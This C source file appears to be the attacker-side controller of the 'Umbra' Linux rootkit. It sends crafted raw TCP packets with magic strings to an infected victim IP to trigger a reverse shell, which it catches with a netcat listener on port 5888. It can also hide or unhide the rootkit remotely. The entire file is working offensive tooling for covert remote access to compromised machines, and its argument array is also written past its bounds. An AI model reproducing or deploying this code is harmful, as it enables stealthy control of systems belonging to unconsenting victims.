#include "lib/RawTCP.h"
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>

// For printing with colors
#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"

void print_welcome_message(){
    printf("*******************************************************\n");
    printf("************* Umbra  Injector *************************\n");
    printf("*******************************************************\n");
    printf("************ https://github.com/h3xduck/Umbra *********\n");
    printf("*******************************************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s [OPTION] victim_IP\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S victim_IP";
    char* desc = "Get a remote shell to victim_IP";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "-u victim_IP";
    desc = "Unhide the rootkit remotely from the host";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "-i victim_IP";
    desc = "Hide the rootkit remotely from the host";
    printf("\t%-50s %-50s\n\n", line, desc);
    line = "\nProgram options";
    printf("\t%-50s\n", line);
    line = "-h";
    desc = "Print this help";
    printf("\t%-50s %-50s\n\n", line, desc);

}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
        exit(1);
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
  
    return IPbuffer;
}


void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);
        //Sending the malicious payload
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {
        //Activating listener
        char *cmd = "nc";
        char *argv[3];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "5888";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error executing background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}

void show_rootkit(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_SHOW_ROOTKIT");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to unhide successfully sent!\n");
    }
    free(local_ip);
}

void hide_rootkit(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_HIDE_ROOTKIT");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
    //Sending the malicious payload
    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to hide successfully sent!\n");
    }
    free(local_ip);
}


void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
        print_help_dialog(argv[0]);
        return;
    }
    
    
    int opt;
    char dest_address[32];

    //Command line argument parsing
    while ((opt = getopt(argc, argv, ":S:u:i:h")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);
            //Get a shell mode
            printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            get_shell(dest_address);
            
            break;
        case 'u': 
            print_welcome_message();
            sleep(1);
            //Selecting show rootkit - Unhide mode
            printf("["KBLU"INFO"RESET"]""Selected UNHIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            show_rootkit(dest_address);

            break;
        case 'i': 
            print_welcome_message();
            sleep(1);
            //Selecting hide rootkit - Invisible mode
            printf("["KBLU"INFO"RESET"]""Selected HIDE the rootkit remotely\n");
            //printf("Option m has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            hide_rootkit(dest_address);

            break;
        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("["KRED"ERROR"RESET"]""Unknown option: %c\n", optopt);
            break;
        case ':':
            printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
   
}